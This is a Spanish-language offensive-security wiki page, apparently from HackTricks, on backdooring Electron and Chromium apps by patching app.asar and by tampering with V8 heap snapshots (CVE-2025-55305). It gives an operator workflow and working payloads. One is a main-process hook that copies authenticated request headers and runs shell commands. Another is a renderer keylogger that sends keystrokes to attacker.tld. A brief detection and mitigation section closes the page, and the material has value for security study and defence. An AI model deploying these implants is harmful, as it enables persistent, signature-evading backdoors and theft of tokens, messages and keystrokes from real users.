# Inyección de código local y manipulación de snapshots en Electron

{{#include ../../banners/hacktricks-training.md}}

## Inyección de código local en Electron

Si puedes modificar o instrumentar una aplicación Electron instalada localmente, es posible que puedas hacer que ejecute JavaScript arbitrario. Consulta:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Para obtener información sobre una superficie de depuración de Node inspector o Chromium DevTools local, consulta [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: implantes en ASAR/main-process

Si obtienes **acceso de escritura** al directorio de recursos de una aplicación Electron, una técnica de post-exploitation muy práctica consiste en **modificar `app.asar`** (o el punto de entrada JS que carga) y esperar a que el usuario vuelva a iniciar la aplicación. A diferencia de un XSS que afecta solo al renderer, el código cargado desde el **main process** se ejecuta en el **runtime de Node.js** de la aplicación, por lo que normalmente puede acceder al **sistema de archivos**, ejecutar comandos, interceptar APIs de Electron e inspeccionar el estado autenticado de la aplicación.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Flujo de trabajo típico:

1. Extrae `app.asar` e identifica el archivo de arranque real en `package.json` (`main`) o en la lógica de inicio existente.
2. Añade un pequeño loader en el **main process** (o un hook de preload/main-process) y vuelve a empaquetar el archivo.
3. Espera a que la aplicación se inicie de nuevo y usa el implante para capturar datos del runtime después de que el usuario desbloquee la aplicación de escritorio o se autentique en ella.

Ejemplo mínimo de modificación del bootstrap:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Implicaciones prácticas:

- **Robo de datos de clientes de confianza**: una vez que la aplicación de escritorio descifra o carga datos para el usuario, el implant puede leerlos desde el runtime. Por eso, los **clientes de mensajería E2EE** (Signal/Slack/Mattermost) y los **gestores de vaults/secretos** siguen siendo objetivos interesantes en la capa del endpoint.
- **Abuso de sesiones/tokens**: los implants de Electron pueden robar cookies de la aplicación, bearer tokens, encabezados de solicitudes, archivos de workspace o credenciales de repos expuestas al cliente en ejecución (por ejemplo, extensiones autenticadas de VS Code o integraciones con Git).
- **Pivoting desde el contexto de la víctima**: una aplicación parcheada puede enviar solicitudes a través de la workstation de la víctima, reutilizando la IP, la huella TLS y la sesión de la aplicación de la víctima, en lugar de limitarse a exfiltrar tokens sin procesar.

> [!NOTE]
> Si el objetivo habilita **ASAR integrity** / **OnlyLoadAppFromAsar** o los **fuses** de Electron reforzados, quizá necesites otra primitiva de carga de código local (por ejemplo, abuso de fuses o snapshot tampering). Consulta la página de inyección específica para macOS para ver más opciones de implants locales y detalles de los fuses.

## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Las aplicaciones basadas en Electron y Chromium deserializan al iniciar un snapshot de heap de V8 precompilado (v8_context_snapshot.bin y, opcionalmente, browser_v8_context_snapshot.bin) para inicializar cada isolate de V8 (main, preload, renderer). Históricamente, los fuses de integridad de Electron no consideraban estos snapshots contenido ejecutable, por lo que eludían tanto la aplicación de integridad basada en fuses como las comprobaciones de firma de código del sistema operativo. Como resultado, reemplazar el snapshot en una instalación donde el usuario pudiera escribir permitía una ejecución de código sigilosa y persistente dentro de la aplicación, sin modificar los binarios firmados ni ASAR.<sup>[[2]](#references)</sup>

Puntos clave
- Brecha de integridad: EnableEmbeddedAsarIntegrityValidation y OnlyLoadAppFromAsar validan el JavaScript de la aplicación dentro de ASAR, pero no cubrían los snapshots de heap de V8 (CVE-2025-55305). Chromium tampoco verifica la integridad de los snapshots.<sup>[[3]](#references)[[4]](#references)</sup>
- Requisitos previos del ataque: escritura local de archivos en el directorio de instalación de la aplicación. Esto es habitual en sistemas donde las aplicaciones Electron o los navegadores Chromium están instalados en rutas donde el usuario puede escribir (p. ej., %AppData%\Local en Windows; /Applications con ciertas limitaciones en macOS).
- Efecto: ejecución fiable de JavaScript del atacante en cualquier isolate mediante la sustitución de un builtin de uso frecuente (un “gadget”), lo que permite persistencia y evadir la verificación de firma de código.
- Superficie afectada: aplicaciones Electron (incluso con fuses habilitados) y navegadores basados en Chromium que cargan snapshots desde ubicaciones donde el usuario puede escribir.

Generación de un snapshot malicioso sin compilar Chromium
- Usa el electron/mksnapshot precompilado para compilar un payload JS en un snapshot y sobrescribir el v8_context_snapshot.bin de la aplicación.<sup>[[5]](#references)[[6]](#references)</sup>

Ejemplo de payload mínimo (demostrar la ejecución forzando un crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Enrutamiento de payloads consciente de los isolates (ejecutar código diferente en main vs. renderer)
- Detección del proceso principal: los globals exclusivos de Node, como process.pid, process.binding() o process.dlopen, están presentes en el isolate del proceso principal.
- Detección del navegador/renderer: los globals exclusivos del navegador, como alert, están disponibles al ejecutarse en un contexto de documento.

Ejemplo de gadget que sondea una vez las capacidades de Node del proceso principal
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC de robo de datos en el contexto de renderer/navegador (p. ej., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Flujo de trabajo del operador
1) Escribe payload.js para sobrescribir un builtin común (p. ej., Array.isArray) y, opcionalmente, ejecutar ramas según el isolate.
2) Crea el snapshot sin las fuentes de Chromium:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Sobrescribe los archivos de snapshot de la aplicación objetivo:
   - v8_context_snapshot.bin (siempre se usa)
   - browser_v8_context_snapshot.bin (si se usa el fuse LoadBrowserProcessSpecificV8Snapshot)
4) Inicia la aplicación; el gadget se ejecuta cada vez que se usa el builtin elegido.

Notas y consideraciones
- Evasión de controles de integridad y firmas: los archivos de snapshot no se consideran ejecutables nativos en las comprobaciones de firma de código y, históricamente, no estaban cubiertos por los fuses de Electron ni por los controles de integridad de Chromium.
- Persistencia: reemplazar el snapshot en una instalación en una ubicación con permisos de escritura para el usuario suele persistir tras reiniciar la aplicación y hace que esta parezca legítima y firmada.
- Navegadores Chromium: el mismo concepto de manipulación se aplica a Chrome y sus derivados instalados en ubicaciones con permisos de escritura para el usuario. Chrome tiene otras mitigaciones de integridad, pero excluye explícitamente los ataques físicamente locales de su modelo de amenazas.<sup>[[9]](#references)[[10]](#references)</sup>

Detección y mitigaciones
- Trata los snapshots como contenido ejecutable e inclúyelos en la aplicación de controles de integridad (corrección de CVE-2025-55305).
- Prefiere las ubicaciones de instalación donde solo los administradores tengan permisos de escritura; establece una línea base y supervisa los hashes de v8_context_snapshot.bin y browser_v8_context_snapshot.bin.
- Detecta la sobrescritura de builtins durante la ejecución inicial y los cambios inesperados en los snapshots; genera alertas cuando los snapshots deserializados no coincidan con los valores esperados.

## References

- [1] [JS-Tap v3: post-explotación de endpoints con implantes de JavaScript](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Subvertir las comprobaciones de integridad de código para instalar puertas traseras locales en Signal, 1Password, Slack y otras aplicaciones](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Fuses de Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Integridad de ASAR de Electron](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [Snapshots de inicio personalizados de V8](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: desactivar la carga de código sin firmar (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Preguntas frecuentes sobre seguridad de Chrome: los ataques físicamente locales quedan fuera del alcance](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
